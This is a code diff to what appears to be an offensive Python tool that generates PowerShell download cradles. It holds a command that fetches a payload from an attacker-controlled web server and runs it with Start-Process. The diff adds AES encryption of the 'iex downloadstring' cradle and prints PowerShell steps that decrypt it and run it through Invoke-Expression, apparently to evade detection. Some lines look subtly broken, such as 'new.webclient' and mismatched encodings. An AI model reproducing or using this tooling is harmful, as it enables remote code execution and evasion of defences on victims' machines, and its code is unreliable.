@@ -9,6 +9,7 @@ import shutil
 import subprocess
 from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
+from Cryptodome.Util.Padding import pad, unpad
 import base64
 
 def help():
@@ -17,6 +18,12 @@ def help():
 def kill_sig(conn,msg):
     msg = str(msg)
     conn.send(msg.encode())
+def encrypt_msg(msg,key,iv):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    padded_msg = pad(msg.encode('utf-16le'), AES.block_size)
+    encrypted_msg = cipher.encrypt(padded_msg)
+    encrypted_base64 = base64.b64encode(encrypted_msg).decode('utf-16le')
+    return encrypted_base64
 def winclient():
     name = (''.join(random.choices(string.ascii_lowercase,k=7)))
     filename = name+".py"
@@ -90,14 +97,25 @@ def pshell_cradle():
     payload = input("Enter payload file with extension\n")
     runner = (''.join(random.choices(string.ascii_lowercase,k=7))) + ".txt"
     print(f"Enter following command to start a web server\n python3 -m http.server -b {web_server_ip} {web_server_port}")
-    runner_unencoded = f'iex (new-object new.webclient).downloadstring("http://{web_server_ip}:{web_server_port}/{runner}")'.encode("utf-16le")
+    runner_unencoded = f'iex (new-object new.webclient).downloadstring("http://{web_server_ip}:{web_server_port}/{runner}")'
     with open(runner, 'w') as f:
         f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload}; Start-Process -FilePath {payload}')
         f.close()
-    base64_runner_unencoded = base64.b64encode(runner_unencoded)
-    base64_runner_unencoded = base64_runner_unencoded.decode()
-    print(f'Encoded Payload\n powershell -e {base64_runner_unencoded}')
-    
+    key = get_random_bytes(32)
+    iv = get_random_bytes(16)
+    aes_runner_encoded = encrypt_msg(runner_unencoded, key,iv)
+    print(f'Key : {base64.b64encode(key).decode('utf-16le')}\n')
+    print(f'IV : {base64.b64encode(iv).decode('utf-16le')}\n')
+    print(f'Encrypted Command\n {aes_runner_encoded}\n')
+    print(f'Enter below commands on powershell to download and run runner file\n')
+    print(f'$encryptedCommand = {aes_runner_encoded}\n $encryptedKey = {base64.b64encode(key).decode('utf-16le')}\n $encryptedIV = {base64.b64encode(iv).decode('utf-16le')}\n')
+    print(f'$decodedCommandBytes = [System.Convert]::FromBase64String($encryptedCommand)\n $decodedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)\n $decodedIVBytes = [System.Convert]::FromBase64String($encryptedIV)\n')
+    print(f'$iv = $decodedIVBytes\n $encryptedCommandBytes = $decodedCommandBytes[16..($decodedCommandBytes.Length - 1)]\n')
+    print(f'$key = $decodedKeyBytes\n $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider\n $AES.Key = $key\n $AES.IV = $iv\n')
+    print(f'$decryptor = $AES.CreateDecryptor()\n $decryptedBytes = $decryptor.TransformFinalBlock($encryptedCommandBytes, 0, $encryptedCommandBytes.Length)\n')
+    print(f'$decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)\n')
+    print(f'Invoke-Expression $decryptedCommand\n')
+
 def conn_handler():
     while True:
         if kill_flag==1:
